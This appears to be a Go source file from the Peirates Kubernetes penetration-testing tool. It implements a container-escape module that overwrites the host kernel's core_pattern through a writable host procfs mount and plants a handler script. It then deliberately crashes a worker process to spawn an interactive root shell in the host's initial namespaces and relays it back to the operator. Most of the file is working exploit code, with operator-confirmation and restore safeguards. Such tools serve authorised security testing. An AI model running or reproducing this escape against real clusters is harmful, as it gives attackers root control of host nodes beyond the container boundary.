//go:build linux

package hostproc

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
	"time"

	"github.com/inguardians/peirates/internal/modules/escapeutil"
	"golang.org/x/sys/unix"
)

const (
	procSelfMountInfo  = "/proc/self/mountinfo"
	corePatternSuffix  = "sys/kernel/core_pattern"
	maximumPatternSize = 127
	maximumSysctlRead  = 4 * 1024
	readyPrefix        = "PEIRATES_HOSTPROC_READY_"
)

type preparedPayload struct {
	localDirectory  string
	localInput      string
	localOutput     string
	localHandler    string
	corePattern     string
	readyMarker     string
	input           *os.File
	outputBootstrap *os.File
	output          *os.File
}

func (payload *preparedPayload) cleanup() {
	if payload.output != nil {
		_ = payload.output.Close()
		payload.output = nil
	}
	if payload.outputBootstrap != nil {
		_ = payload.outputBootstrap.Close()
		payload.outputBootstrap = nil
	}
	if payload.input != nil {
		_ = payload.input.Close()
		payload.input = nil
	}
	if payload.localDirectory != "" {
		_ = os.RemoveAll(payload.localDirectory)
		payload.localDirectory = ""
	}
}

type corePatternGuard struct {
	file      *os.File
	original  string
	installed string
	active    bool
}

func probe(ctx context.Context, options normalizedOptions) (Finding, error) {
	if err := ctx.Err(); err != nil {
		return Finding{}, err
	}
	if os.Geteuid() != 0 {
		return Finding{}, fmt.Errorf("effective UID 0 is required")
	}
	if err := unix.Access("/bin/sh", unix.X_OK); err != nil {
		return Finding{}, fmt.Errorf("local /bin/sh is required for the disposable crash worker: %w", err)
	}
	mountData, err := os.ReadFile(procSelfMountInfo)
	if err != nil {
		return Finding{}, fmt.Errorf("read %s: %w", procSelfMountInfo, err)
	}
	mounts, err := escapeutil.ParseMountInfo(mountData)
	if err != nil {
		return Finding{}, fmt.Errorf("parse %s: %w", procSelfMountInfo, err)
	}
	finding, err := resolveHostProc(options.HostProcPath, mounts)
	if err != nil {
		return Finding{}, err
	}
	finding.Caveat = "The core handler runs in the initial namespaces of this kernel. For a containerized Kubernetes node such as Kind, those namespaces can be outside the node container."
	return finding, nil
}

func resolveHostProc(explicit string, mounts []escapeutil.Mount) (Finding, error) {
	if explicit != "" {
		if err := validateAbsolutePath(explicit, "host procfs mount"); err != nil {
			return Finding{}, err
		}
		if !isFullProcMount(explicit, mounts) {
			return Finding{}, fmt.Errorf("selected path %s is not a full procfs mount from %s", explicit, procSelfMountInfo)
		}
		return qualifyHostProc(explicit)
	}

	var candidates []string
	for _, mount := range mounts {
		if mount.FSType == "proc" && mount.Root == "/" && filepath.IsAbs(mount.MountPoint) {
			candidates = append(candidates, filepath.Clean(mount.MountPoint))
		}
	}
	candidates = escapeutil.SortedUnique(candidates)
	qualifiedByIdentity := make(map[escapeutil.FileIdentity]Finding)
	var firstError error
	for _, candidate := range candidates {
		finding, err := qualifyHostProc(candidate)
		if err != nil {
			if firstError == nil {
				firstError = fmt.Errorf("procfs candidate %s failed qualification: %w", candidate, err)
			}
			continue
		}
		if _, exists := qualifiedByIdentity[finding.CorePatternIdentity]; !exists {
			qualifiedByIdentity[finding.CorePatternIdentity] = finding
		}
	}
	qualified := make([]Finding, 0, len(qualifiedByIdentity))
	for _, finding := range qualifiedByIdentity {
		qualified = append(qualified, finding)
	}
	sort.Slice(qualified, func(left, right int) bool {
		return qualified[left].HostProcPath < qualified[right].HostProcPath
	})
	switch len(qualified) {
	case 0:
		if firstError != nil {
			return Finding{}, firstError
		}
		return Finding{}, fmt.Errorf("no writable host procfs candidate was found; specify an absolute procfs mount path")
	case 1:
		return qualified[0], nil
	default:
		paths := make([]string, 0, len(qualified))
		for _, finding := range qualified {
			paths = append(paths, finding.HostProcPath)
		}
		return Finding{}, fmt.Errorf("multiple writable host procfs candidates were found (%s); specify one absolute path", strings.Join(paths, ", "))
	}
}

func qualifyHostProc(path string) (Finding, error) {
	directory, _, err := escapeutil.OpenDirectoryNoFollow(path)
	if err != nil {
		return Finding{}, fmt.Errorf("open host procfs without following symlinks: %w", err)
	}
	_ = directory.Close()

	corePatternPath := filepath.Join(path, corePatternSuffix)
	file, identity, err := openCorePattern(corePatternPath)
	if err != nil {
		return Finding{}, err
	}
	defer file.Close()
	original, err := readCorePattern(file)
	if err != nil {
		return Finding{}, fmt.Errorf("read host core_pattern: %w", err)
	}
	return Finding{
		HostProcPath:        path,
		CorePatternPath:     corePatternPath,
		OriginalCorePattern: original,
		CorePatternIdentity: identity,
	}, nil
}

func isFullProcMount(path string, mounts []escapeutil.Mount) bool {
	for _, mount := range mounts {
		if mount.FSType == "proc" && mount.Root == "/" && filepath.Clean(mount.MountPoint) == path {
			return true
		}
	}
	return false
}

func launch(parent context.Context, options normalizedOptions) (returnErr error) {
	if !options.ConfirmMutation {
		return fmt.Errorf("exact operator confirmation is required before changing host core_pattern")
	}
	if options.ExpectedCorePattern == nil {
		return fmt.Errorf("the operator-reviewed core_pattern value is required before mutation")
	}
	ctx, stopSignals := signal.NotifyContext(parent, os.Interrupt, syscall.SIGTERM, syscall.SIGHUP)
	defer stopSignals()

	finding, err := probe(ctx, options)
	if err != nil {
		return err
	}
	if finding.OriginalCorePattern != *options.ExpectedCorePattern {
		return fmt.Errorf("host core_pattern changed after operator review; refusing mutation")
	}
	if strings.HasPrefix(strings.TrimSpace(finding.OriginalCorePattern), "|") && !options.AllowReplacePipedHandler {
		return fmt.Errorf("host core_pattern already contains a piped crash handler; explicit override is required")
	}

	payload, err := preparePayload()
	if err != nil {
		return err
	}
	defer payload.cleanup()

	guard, err := newCorePatternGuard(finding)
	if err != nil {
		return err
	}
	var crasher *exec.Cmd
	var crashDone chan error
	crashWaited := true
	defer func() {
		returnErr = errors.Join(returnErr, guard.restore())
		if !crashWaited {
			terminateCrashWorker(crasher, crashDone)
		}
		returnErr = errors.Join(returnErr, guard.file.Close())
	}()
	fmt.Fprintf(options.Stderr, "%s temporarily replacing %s to start a shell in the initial namespaces; the original value will be restored before shell relay\n", outputPrefix, finding.CorePatternPath)
	if err := guard.install(payload.corePattern); err != nil {
		return err
	}

	crasher = exec.Command("/proc/self/exe", CrashWorkerArgument)
	if err := crasher.Start(); err != nil {
		return fmt.Errorf("start disposable crash worker: %w", err)
	}
	crashDone = make(chan error, 1)
	go func() { crashDone <- crasher.Wait() }()
	crashWaited = false

	if err := payload.waitForHandler(ctx, options.TriggerTimeout); err != nil {
		return fmt.Errorf("wait for host core handler: %w", err)
	}
	if err := payload.prepareOutput(); err != nil {
		return err
	}
	if err := guard.restore(); err != nil {
		return fmt.Errorf("restore host core_pattern before shell relay: %w", err)
	}

	fmt.Fprintf(options.Stdout, "Host core_pattern restored. Entering the initial-namespace shell through %s; exit returns to Peirates.\n", finding.HostProcPath)
	streamErr := relayHostShell(ctx, payload, options.Stdin, options.Stdout)
	payload.closeStreams()
	crashErr, crashWasWaited := waitForCrashWorker(crashDone, options.TriggerTimeout)
	crashWaited = crashWasWaited
	if streamErr != nil {
		return streamErr
	}
	if !crashWasWaited {
		return crashErr
	}
	if !isExpectedCrash(crashErr) {
		if crashErr == nil {
			return fmt.Errorf("disposable crash worker exited without SIGSEGV")
		}
		return fmt.Errorf("disposable crash worker did not terminate with SIGSEGV: %w", crashErr)
	}
	return nil
}

func preparePayload() (*preparedPayload, error) {
	token, err := randomToken()
	if err != nil {
		return nil, err
	}
	localDirectory := "/.p" + token
	if err := os.Mkdir(localDirectory, 0700); err != nil {
		return nil, fmt.Errorf("create temporary payload directory: %w", err)
	}
	payload := &preparedPayload{
		localDirectory: localDirectory,
		localInput:     filepath.Join(localDirectory, "i"),
		localOutput:    filepath.Join(localDirectory, "o"),
		localHandler:   filepath.Join(localDirectory, "h"),
		readyMarker:    readyPrefix + token,
	}
	failed := true
	defer func() {
		if failed {
			payload.cleanup()
		}
	}()

	payload.corePattern, err = coreHandlerPattern(payload.localHandler)
	if err != nil {
		return nil, err
	}
	handler := hostHandlerScript(payload.readyMarker)
	handlerFile, err := os.OpenFile(payload.localHandler, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0700)
	if err != nil {
		return nil, fmt.Errorf("create temporary host handler: %w", err)
	}
	if _, err := io.WriteString(handlerFile, handler); err != nil {
		_ = handlerFile.Close()
		return nil, fmt.Errorf("write temporary host handler: %w", err)
	}
	if err := handlerFile.Close(); err != nil {
		return nil, fmt.Errorf("close temporary host handler: %w", err)
	}
	if err := unix.Mkfifo(payload.localInput, 0600); err != nil {
		return nil, fmt.Errorf("create host-shell input FIFO: %w", err)
	}
	if err := unix.Mkfifo(payload.localOutput, 0600); err != nil {
		return nil, fmt.Errorf("create host-shell output FIFO: %w", err)
	}

	payload.input, err = openFIFO(payload.localInput, unix.O_RDWR|unix.O_NONBLOCK|unix.O_CLOEXEC)
	if err != nil {
		return nil, fmt.Errorf("open host-shell input FIFO: %w", err)
	}
	payload.outputBootstrap, err = openFIFO(payload.localOutput, unix.O_RDWR|unix.O_NONBLOCK|unix.O_CLOEXEC)
	if err != nil {
		return nil, fmt.Errorf("open host-shell output FIFO: %w", err)
	}
	if err := verifyLocalPayload(payload, handler); err != nil {
		return nil, err
	}
	failed = false
	return payload, nil
}

func hostHandlerScript(marker string) string {
	return "#!/bin/sh\n" +
		"base=${0%/*}\n" +
		"exec 3<\"$base/i\"\n" +
		"exec 4>\"$base/o\"\n" +
		"exec 0<&3 1>&4 2>&1\n" +
		"exec 3<&- 4>&-\n" +
		"printf '%s\\n' '" + marker + "'\n" +
		"unset ENV BASH_ENV CDPATH GLOBIGNORE\n" +
		"export HOME=/root USER=root LOGNAME=root SHELL=/bin/sh\n" +
		"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n" +
		"export PS1='[peirates-hostproc]# '\n" +
		"exec /bin/sh -i\n"
}

func verifyLocalPayload(payload *preparedPayload, expectedHandler string) error {
	fd, err := unix.Open(payload.localHandler, unix.O_RDONLY|unix.O_CLOEXEC|unix.O_NOFOLLOW, 0)
	if err != nil {
		return fmt.Errorf("open temporary core handler without following symlinks: %w", err)
	}
	file := os.NewFile(uintptr(fd), payload.localHandler)
	if file == nil {
		_ = unix.Close(fd)
		return fmt.Errorf("construct temporary core handler file")
	}
	info, err := file.Stat()
	if err != nil {
		_ = file.Close()
		return fmt.Errorf("inspect temporary core handler: %w", err)
	}
	if !info.Mode().IsRegular() || info.Mode().Perm()&0100 == 0 {
		_ = file.Close()
		return fmt.Errorf("temporary core handler is not an executable regular file")
	}
	data, readErr := io.ReadAll(io.LimitReader(file, int64(len(expectedHandler)+1)))
	closeErr := file.Close()
	if readErr != nil {
		return fmt.Errorf("read temporary core handler: %w", readErr)
	}
	if closeErr != nil {
		return fmt.Errorf("close temporary core handler: %w", closeErr)
	}
	if string(data) != expectedHandler {
		return fmt.Errorf("temporary core handler contents changed during preparation")
	}
	for _, localPath := range []string{payload.localInput, payload.localOutput} {
		info, err := os.Lstat(localPath)
		if err != nil {
			return fmt.Errorf("inspect core-handler FIFO %s: %w", filepath.Base(localPath), err)
		}
		if info.Mode()&os.ModeNamedPipe == 0 || info.Mode()&os.ModeSymlink != 0 {
			return fmt.Errorf("core-handler path %s is not a direct FIFO", localPath)
		}
	}
	return nil
}

func (payload *preparedPayload) waitForHandler(parent context.Context, timeout time.Duration) error {
	ctx, cancel := context.WithTimeout(parent, timeout)
	defer cancel()
	expected := payload.readyMarker + "\n"
	var received strings.Builder
	descriptor := []unix.PollFd{{Fd: int32(payload.outputBootstrap.Fd()), Events: unix.POLLIN}}
	buffer := []byte{0}
	for received.Len() < len(expected) {
		if err := ctx.Err(); err != nil {
			return err
		}
		ready, err := unix.Poll(descriptor, 100)
		if err != nil {
			if errors.Is(err, unix.EINTR) {
				continue
			}
			return err
		}
		if ready == 0 {
			continue
		}
		if descriptor[0].Revents&(unix.POLLERR|unix.POLLNVAL) != 0 {
			return fmt.Errorf("handler output FIFO became unavailable")
		}
		count, err := unix.Read(int(payload.outputBootstrap.Fd()), buffer)
		if count > 0 {
			received.WriteByte(buffer[0])
			if !strings.HasPrefix(expected, received.String()) {
				return fmt.Errorf("handler returned an unexpected readiness marker")
			}
		}
		if err != nil && !errors.Is(err, unix.EAGAIN) && !errors.Is(err, unix.EINTR) {
			return err
		}
	}
	return nil
}

func (payload *preparedPayload) prepareOutput() error {
	output, err := openFIFO(payload.localOutput, unix.O_RDONLY|unix.O_NONBLOCK|unix.O_CLOEXEC)
	if err != nil {
		return fmt.Errorf("open host-shell output stream: %w", err)
	}
	if err := unix.SetNonblock(int(output.Fd()), false); err != nil {
		_ = output.Close()
		return fmt.Errorf("prepare blocking host-shell output stream: %w", err)
	}
	payload.output = output
	if err := unix.SetNonblock(int(payload.input.Fd()), false); err != nil {
		return fmt.Errorf("prepare blocking host-shell input stream: %w", err)
	}
	if err := payload.outputBootstrap.Close(); err != nil {
		return fmt.Errorf("close host-shell output bootstrap: %w", err)
	}
	payload.outputBootstrap = nil
	return nil
}

func (payload *preparedPayload) closeStreams() {
	if payload.input != nil {
		_ = payload.input.Close()
		payload.input = nil
	}
	if payload.output != nil {
		_ = payload.output.Close()
		payload.output = nil
	}
}

func newCorePatternGuard(finding Finding) (*corePatternGuard, error) {
	file, identity, err := openCorePattern(finding.CorePatternPath)
	if err != nil {
		return nil, err
	}
	if !identity.Equal(finding.CorePatternIdentity) {
		_ = file.Close()
		return nil, fmt.Errorf("host core_pattern identity changed after preflight")
	}
	original, err := readCorePattern(file)
	if err != nil {
		_ = file.Close()
		return nil, fmt.Errorf("repeat host core_pattern read: %w", err)
	}
	if original != finding.OriginalCorePattern {
		_ = file.Close()
		return nil, fmt.Errorf("host core_pattern changed during preflight; refusing mutation")
	}
	return &corePatternGuard{file: file, original: original}, nil
}

func (guard *corePatternGuard) install(pattern string) error {
	current, err := readCorePattern(guard.file)
	if err != nil {
		return fmt.Errorf("compare host core_pattern before mutation: %w", err)
	}
	if current != guard.original {
		return fmt.Errorf("host core_pattern changed immediately before mutation; refusing overwrite")
	}
	guard.installed = pattern
	guard.active = true
	if err := writeCorePattern(guard.file, pattern); err != nil {
		return fmt.Errorf("install temporary host core_pattern: %w", err)
	}
	installed, err := readCorePattern(guard.file)
	if err != nil {
		return fmt.Errorf("verify temporary host core_pattern: %w", err)
	}
	if installed != pattern {
		return fmt.Errorf("temporary host core_pattern verification failed")
	}
	return nil
}

func (guard *corePatternGuard) restore() error {
	if guard == nil || !guard.active {
		return nil
	}
	current, err := readCorePattern(guard.file)
	if err != nil {
		return fmt.Errorf("read host core_pattern before restoration: %w", err)
	}
	if current != guard.installed {
		return fmt.Errorf("refusing to restore host core_pattern because it changed after Peirates installed its handler")
	}
	if err := writeCorePattern(guard.file, guard.original); err != nil {
		return fmt.Errorf("restore original host core_pattern: %w", err)
	}
	restored, err := readCorePattern(guard.file)
	if err != nil {
		return fmt.Errorf("verify restored host core_pattern: %w", err)
	}
	if restored != guard.original {
		return fmt.Errorf("restored host core_pattern does not match the original value")
	}
	guard.active = false
	return nil
}

func openCorePattern(path string) (*os.File, escapeutil.FileIdentity, error) {
	fd, err := unix.Open(path, unix.O_RDWR|unix.O_CLOEXEC|unix.O_NOFOLLOW, 0)
	if err != nil {
		return nil, escapeutil.FileIdentity{}, fmt.Errorf("open writable host core_pattern %s: %w", path, err)
	}
	var stat unix.Stat_t
	if err := unix.Fstat(fd, &stat); err != nil {
		_ = unix.Close(fd)
		return nil, escapeutil.FileIdentity{}, fmt.Errorf("inspect opened host core_pattern: %w", err)
	}
	if stat.Mode&unix.S_IFMT != unix.S_IFREG {
		_ = unix.Close(fd)
		return nil, escapeutil.FileIdentity{}, fmt.Errorf("host core_pattern path is not a regular procfs file")
	}
	file := os.NewFile(uintptr(fd), path)
	if file == nil {
		_ = unix.Close(fd)
		return nil, escapeutil.FileIdentity{}, fmt.Errorf("construct host core_pattern file")
	}
	return file, escapeutil.FileIdentity{Device: uint64(stat.Dev), Inode: stat.Ino}, nil
}

func readCorePattern(file *os.File) (string, error) {
	if _, err := file.Seek(0, io.SeekStart); err != nil {
		return "", err
	}
	data, err := io.ReadAll(io.LimitReader(file, maximumSysctlRead+1))
	if err != nil {
		return "", err
	}
	if len(data) > maximumSysctlRead {
		return "", fmt.Errorf("core_pattern exceeds %d bytes", maximumSysctlRead)
	}
	value := strings.TrimSuffix(string(data), "\n")
	if strings.ContainsAny(value, "\x00\r\n") {
		return "", fmt.Errorf("core_pattern contains invalid control characters")
	}
	return value, nil
}

func writeCorePattern(file *os.File, value string) error {
	if _, err := file.Seek(0, io.SeekStart); err != nil {
		return err
	}
	data := []byte(value + "\n")
	written, err := file.Write(data)
	if err != nil {
		return err
	}
	if written != len(data) {
		return io.ErrShortWrite
	}
	return nil
}

func relayHostShell(ctx context.Context, payload *preparedPayload, stdin io.Reader, stdout io.Writer) error {
	input := payload.input
	output := payload.output
	inputContext, cancelInput := context.WithCancel(ctx)
	defer cancelInput()
	inputDone := make(chan error, 1)
	outputDone := make(chan error, 1)
	go func() {
		inputDone <- copyHostInput(inputContext, input, stdin)
		_ = input.Close()
	}()
	go func() {
		_, err := io.Copy(stdout, output)
		outputDone <- err
	}()

	select {
	case err := <-outputDone:
		cancelInput()
		_ = input.Close()
		if err != nil && !errors.Is(err, os.ErrClosed) {
			return fmt.Errorf("copy host-shell output: %w", err)
		}
		select {
		case inputErr := <-inputDone:
			if inputErr != nil && !errors.Is(inputErr, context.Canceled) && !errors.Is(inputErr, os.ErrClosed) {
				return fmt.Errorf("copy host-shell input: %w", inputErr)
			}
		default:
		}
		return nil
	case <-ctx.Done():
		cancelInput()
		_ = input.Close()
		_ = output.Close()
		<-outputDone
		return fmt.Errorf("host-shell relay interrupted: %w", ctx.Err())
	}
}

func copyHostInput(ctx context.Context, destination io.Writer, source io.Reader) error {
	file, ok := source.(*os.File)
	if !ok {
		_, err := io.Copy(destination, source)
		return err
	}
	descriptor := []unix.PollFd{{Fd: int32(file.Fd()), Events: unix.POLLIN | unix.POLLHUP}}
	buffer := make([]byte, 32*1024)
	for {
		if err := ctx.Err(); err != nil {
			return err
		}
		ready, err := unix.Poll(descriptor, 100)
		if err != nil {
			if errors.Is(err, unix.EINTR) {
				continue
			}
			return err
		}
		if ready == 0 {
			continue
		}
		if descriptor[0].Revents&(unix.POLLERR|unix.POLLNVAL) != 0 {
			return fmt.Errorf("terminal input became unavailable")
		}
		if descriptor[0].Revents&(unix.POLLIN|unix.POLLHUP) == 0 {
			continue
		}
		count, readErr := unix.Read(int(file.Fd()), buffer)
		if count > 0 {
			if _, err := destination.Write(buffer[:count]); err != nil {
				return err
			}
		}
		if readErr != nil {
			if errors.Is(readErr, unix.EINTR) || errors.Is(readErr, unix.EAGAIN) {
				continue
			}
			return readErr
		}
		if count == 0 {
			return nil
		}
	}
}

func runCrashWorker(args []string, stderr io.Writer) int {
	if len(args) != 0 {
		fmt.Fprintf(stderr, "%s internal crash worker does not accept arguments\n", outputPrefix)
		return 2
	}
	if err := unix.Prctl(unix.PR_SET_DUMPABLE, 1, 0, 0, 0); err != nil {
		fmt.Fprintf(stderr, "%s make disposable crash worker dumpable: %v\n", outputPrefix, err)
		return 1
	}
	const crashCommand = "kill -SEGV $$"
	if err := unix.Exec("/bin/sh", []string{"sh", "-c", crashCommand}, []string{"PATH=/usr/sbin:/usr/bin:/sbin:/bin"}); err != nil {
		fmt.Fprintf(stderr, "%s start disposable shell crash worker: %v\n", outputPrefix, err)
		return 1
	}
	fmt.Fprintf(stderr, "%s disposable shell crash worker unexpectedly returned\n", outputPrefix)
	return 1
}

func waitForCrashWorker(done <-chan error, timeout time.Duration) (error, bool) {
	timer := time.NewTimer(timeout)
	defer timer.Stop()
	select {
	case err := <-done:
		return err, true
	case <-timer.C:
		return fmt.Errorf("timed out waiting for disposable crash worker"), false
	}
}

func terminateCrashWorker(command *exec.Cmd, done <-chan error) {
	select {
	case <-done:
		return
	default:
	}
	if command.Process != nil {
		_ = command.Process.Kill()
	}
	timer := time.NewTimer(time.Second)
	defer timer.Stop()
	select {
	case <-done:
	case <-timer.C:
	}
}

func isExpectedCrash(err error) bool {
	var exitError *exec.ExitError
	if !errors.As(err, &exitError) {
		return false
	}
	status, ok := exitError.Sys().(syscall.WaitStatus)
	return ok && status.Signaled() && status.Signal() == syscall.SIGSEGV
}

func openFIFO(path string, flags int) (*os.File, error) {
	fd, err := unix.Open(path, flags|unix.O_NOFOLLOW, 0)
	if err != nil {
		return nil, err
	}
	var stat unix.Stat_t
	if err := unix.Fstat(fd, &stat); err != nil {
		_ = unix.Close(fd)
		return nil, fmt.Errorf("inspect FIFO: %w", err)
	}
	if stat.Mode&unix.S_IFMT != unix.S_IFIFO {
		_ = unix.Close(fd)
		return nil, fmt.Errorf("path is not a FIFO")
	}
	file := os.NewFile(uintptr(fd), path)
	if file == nil {
		_ = unix.Close(fd)
		return nil, fmt.Errorf("construct FIFO file")
	}
	return file, nil
}

func randomToken() (string, error) {
	data := make([]byte, 8)
	if _, err := io.ReadFull(rand.Reader, data); err != nil {
		return "", fmt.Errorf("generate payload token: %w", err)
	}
	return hex.EncodeToString(data), nil
}

func coreHandlerPattern(localHandler string) (string, error) {
	if err := validateAbsolutePath(localHandler, "temporary handler"); err != nil {
		return "", err
	}
	for _, character := range localHandler {
		if character < 0x21 || character > 0x7e || character == '%' {
			return "", fmt.Errorf("temporary handler path contains a character unsafe for core_pattern")
		}
	}
	pattern := "|/bin/sh /proc/%P/root" + localHandler
	if len(pattern) > maximumPatternSize {
		return "", fmt.Errorf("temporary core_pattern is %d bytes; the maximum safe length is %d", len(pattern), maximumPatternSize)
	}
	return pattern, nil
}

func validateAbsolutePath(path, description string) error {
	if !filepath.IsAbs(path) {
		return fmt.Errorf("%s path must be absolute", description)
	}
	if filepath.Clean(path) != path {
		return fmt.Errorf("%s path must be normalized", description)
	}
	if strings.ContainsAny(path, "\x00\r\n") {
		return fmt.Errorf("%s path contains invalid control characters", description)
	}
	return nil
}
